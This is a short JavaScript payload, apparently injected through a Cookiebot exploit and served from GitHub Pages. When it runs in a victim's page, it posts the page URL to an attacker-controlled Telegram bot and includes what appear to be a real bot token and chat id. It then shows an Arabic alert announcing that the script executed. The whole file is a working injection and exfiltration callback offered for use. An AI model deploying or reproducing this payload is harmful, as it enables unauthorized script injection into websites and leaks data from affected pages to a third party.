// 🚨 Telegram alert from Cookiebot exploit
fetch("https://api.telegram.org/bot<7418874172:AAFy2mvuxosCEGJEKUls4EoXaSIcjfJ82Ac>/sendMessage", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    chat_id: "<6929699769>",
    text: "🚨 Cookiebot تم استغلاله في: " + location.href
  })
});

alert("🔥 تم تنفيذ السكربت من GitHub Pages!");
